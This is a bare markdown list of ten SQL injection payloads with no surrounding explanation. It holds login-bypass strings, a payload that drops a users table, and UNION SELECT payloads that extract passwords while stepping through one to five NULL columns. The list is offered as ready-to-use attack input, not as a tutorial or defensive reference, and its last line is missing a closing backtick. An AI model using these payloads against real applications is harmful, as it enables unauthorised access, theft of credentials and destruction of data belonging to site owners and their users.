## SQL Injection Payloads

Payload 1: `' OR '1'='1`
Payload 2: `' OR '1'='1' --`
Payload 3: `1'; DROP TABLE users;--`
Payload 4: `1'; SELECT * FROM users WHERE username = 'admin' --`
Payload 5: `1' UNION SELECT password FROM users --`
Payload 6: `1' UNION SELECT NULL, password FROM users --`
Payload 7: `1' UNION SELECT NULL, NULL, password FROM users --`
Payload 8: `1' UNION SELECT NULL, NULL, NULL, password FROM users --`
Payload 9: `1' UNION SELECT NULL, NULL, NULL, NULL, password FROM users --`
Payload 10: `1' UNION SELECT NULL, NULL, NULL, NULL, NULL, password FROM users --
